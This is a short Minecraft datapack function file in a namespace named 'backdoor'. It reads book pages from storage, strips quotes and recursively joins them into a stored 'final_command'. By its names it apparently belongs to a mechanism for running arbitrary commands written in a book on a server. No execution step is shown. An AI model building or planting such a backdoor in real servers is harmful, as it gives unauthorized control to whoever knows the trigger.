data modify storage backdoor:temp page1 set from storage backdoor:temp pages[0].raw
#function backdoor:remove_quotes1 with storage backdoor:temp
execute if score count backdoor.temp matches 2.. run data modify storage backdoor:temp page2_temp set from storage backdoor:temp pages[1].raw
execute if score count backdoor.temp matches 2.. run function backdoor:remove_quotes2 with storage backdoor:temp
execute unless score count backdoor.temp matches 2.. run data modify storage backdoor:temp page2 set value ""



function backdoor:recursive_combine2 with storage backdoor:temp
execute store result score count backdoor.temp run data get storage backdoor:temp pages
execute if score count backdoor.temp matches 2.. run function backdoor:recursive_combine
execute if score count backdoor.temp matches 1 run data modify storage backdoor:temp final_command set from storage backdoor:temp pages[0].raw